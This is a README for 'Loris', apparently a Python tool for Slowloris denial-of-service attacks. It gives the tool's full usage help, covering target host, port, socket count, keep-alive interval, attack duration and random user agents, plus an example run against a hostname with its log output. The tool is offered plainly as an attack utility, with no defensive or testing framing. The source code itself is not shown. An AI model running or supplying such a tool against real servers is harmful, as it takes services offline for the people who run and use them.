# Loris
Implementation of a Slow Loris DOS in Python.

# Usage

Start the tool using python 3:

```
$ python3 Loris.py -h
usage: Loris.py [-h] [-p PORT] [-c COUNT] [-rt REFRESHTIME] [-t TIME] [-ua] [-v] hostname
    
This tool executes a Slowloring attack against the specified hostname or IP
address.
    
positional arguments:
  hostname              target hostname or IP address
    
optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  the target port number
  -c COUNT, --count COUNT
                        number of sockets used for the attack
  -rt REFRESHTIME, --refreshtime REFRESHTIME
                        keep-alive interval of sockets in seconds
  -t TIME, --time TIME  attack time in seconds
  -ua, --useragent      activate to NOT use random user agents
  -v, --verbose         verbose output
```
Example: <br>
```
$ python3 Loris.py www.example.com
01/22/2018 01:33:18  Loris: Starting Slow Loris against www.example.com on port 80 using 100 sockets
01/22/2018 01:33:18  Loris: Attack time is set to 120s, the connection update interval is 10s
```
  
# License
This code is licensed under MIT License
